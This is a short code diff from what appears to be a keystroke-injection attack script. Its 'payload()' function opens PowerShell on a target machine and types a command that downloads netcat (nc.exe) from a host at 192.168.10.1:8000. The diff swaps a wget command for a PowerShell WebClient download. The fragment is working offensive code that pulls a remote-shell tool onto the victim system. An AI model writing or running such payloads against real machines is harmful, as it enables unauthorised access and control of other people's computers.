@@ -75,7 +75,7 @@ def payload():
 	eco.type("powershell")
 	eco.press("ENTER")
 	sleep(1)
-	eco.type("wget http://192.168.10.1:8000/nc.exe -OutFile nc.exe")
+	eco.type("(new-object System.Net.WebClient).DownloadString(\"http://192.168.10.1:8000/nc.exe\") >> nc.exe")
 	eco.press("ENTER")
 	sleep(2)
 
